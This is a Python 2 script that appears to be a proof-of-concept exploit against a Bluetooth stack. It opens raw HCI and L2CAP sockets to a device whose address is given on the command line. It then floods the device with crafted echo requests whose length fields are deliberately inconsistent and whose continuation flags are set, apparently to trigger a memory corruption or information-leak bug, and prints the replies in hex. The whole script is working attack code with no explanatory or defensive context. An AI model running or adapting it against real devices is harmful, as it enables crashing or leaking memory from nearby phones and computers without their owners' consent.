import sys
import socket
import struct
import time
from binascii import hexlify, unhexlify
from thread import start_new_thread
from random import randint, randrange

def recv_l2cap():
    global l2cap
    while True:
        pkt = l2cap.recv(1024)
        if ord(pkt[0]) == 0x9: #ECHO RESP
            print "ECHO", hexlify(pkt)
        else:
            print hexlify(pkt)

handle = 0 #coonection handle
def recv_hci():
    global handle
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03:
            if handle == 0:
                handle = struct.unpack("<H", pkt[4:6])[0]
                print "Got connection handle", handle

            print "HCI", hexlify(pkt)

hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
hci.bind((0,))
start_new_thread(recv_hci, ())

l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
l2cap.connect((sys.argv[1], 0))
start_new_thread(recv_l2cap, ())

while handle == 0:
    pass


def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
    l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) + len(x) + l2cap_len_adj, 1) #len cid

    packet_handle = handle
    packet_handle |= continuation_flags << 12
    hci_hdr = struct.pack("<HH", packet_handle, len(acl_hdr) + len(l2cap_hdr) + len(x)) #handle, len

    hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)

send_echo_hci(0  , "A"*(70))
for i in xrange(255):
    send_echo_hci(i  , "A"*i, l2cap_len_adj=2)
    send_echo_hci(i+1, "A"*i, continuation_flags=1)
    time.sleep(0.1)

    i = (i+1) % 250

raw_input("Done")

